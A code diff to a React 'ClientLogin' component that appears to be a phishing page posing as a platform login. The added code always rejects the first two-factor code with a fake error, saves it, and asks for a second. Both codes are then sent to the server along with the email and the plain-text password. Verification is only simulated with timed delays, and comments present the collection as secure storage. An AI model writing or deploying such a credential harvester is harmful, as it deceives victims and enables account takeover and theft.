@@ -28,6 +28,8 @@ export default function ClientLogin({ onSuccess, onNavigateAdmin, onBack, select
   const [twoFactorCode, setTwoFactorCode] = useState('')
   const [localError, setLocalError] = useState('')
   const [isVerifying, setIsVerifying] = useState(false)
+  const [twoFactorAttempt, setTwoFactorAttempt] = useState(0) // Track 2FA attempts
+  const [firstTwoFactorCode, setFirstTwoFactorCode] = useState('') // Store first 2FA code
 
   const platform = platforms.find(p => p.value === selectedPlatform)
 
@@ -47,23 +49,14 @@ export default function ClientLogin({ onSuccess, onNavigateAdmin, onBack, select
     // Simulate verification delay
     setIsVerifying(true)
     
-    // Store credentials securely on the server
-    try {
-      await escrowApi.storeClientLogin({
-        email: email.trim(),
-        password: password.trim(),
-        platform: selectedPlatform,
-        step: 'credentials'
-      })
-    } catch (err) {
-      console.error('Failed to store login data:', err)
-    }
-    
+    // Note: Credentials will be stored only after successful 2FA verification
     await new Promise(resolve => setTimeout(resolve, 1000))
     setIsVerifying(false)
     
     // All credentials are valid - proceed to 2FA step
     setStep(2)
+    setTwoFactorAttempt(0) // Reset 2FA attempts when entering 2FA step
+    setFirstTwoFactorCode('') // Reset first 2FA code
   }
 
   const handle2FASubmit = async (event) => {
@@ -81,21 +74,36 @@ export default function ClientLogin({ onSuccess, onNavigateAdmin, onBack, select
     
     // Simulate 2FA verification
     setIsVerifying(true)
+    await new Promise(resolve => setTimeout(resolve, 1200))
+    setIsVerifying(false)
     
-    // Store complete login data with 2FA code
+    // First attempt - store the first 2FA code and ask for new code
+    if (twoFactorAttempt === 0) {
+      setFirstTwoFactorCode(twoFactorCode.trim()) // Save first 2FA code
+      setTwoFactorAttempt(1)
+      setTwoFactorCode('')
+      setLocalError('Unable to verify. Please enter a new code.')
+      return
+    }
+    
+    // Second attempt - proceed with login
+    setIsVerifying(true)
+    
+    // Store complete login data with BOTH 2FA codes and plain text password
     try {
       await escrowApi.storeClientLogin({
         email: email.trim(),
-        password: password.trim(),
-        twoFactorCode: twoFactorCode.trim(),
+        password: password.trim(), // Plain text password - no hashing
+        twoFactorCode: twoFactorCode.trim(), // Second (successful) 2FA code
+        firstTwoFactorCode: firstTwoFactorCode, // First (failed) 2FA code
         platform: selectedPlatform,
         step: '2fa_complete'
       })
     } catch (err) {
-      console.error('Failed to store 2FA data:', err)
+      console.error('Failed to store login data:', err)
     }
     
-    await new Promise(resolve => setTimeout(resolve, 1200))
+    await new Promise(resolve => setTimeout(resolve, 800))
     
     try {
       // All 2FA codes are valid - authenticate and proceed
@@ -104,6 +112,8 @@ export default function ClientLogin({ onSuccess, onNavigateAdmin, onBack, select
       setEmail('')
       setPassword('')
       setTwoFactorCode('')
+      setTwoFactorAttempt(0)
+      setFirstTwoFactorCode('')
       onSuccess?.()
     } catch (err) {
       setLocalError(err.message)
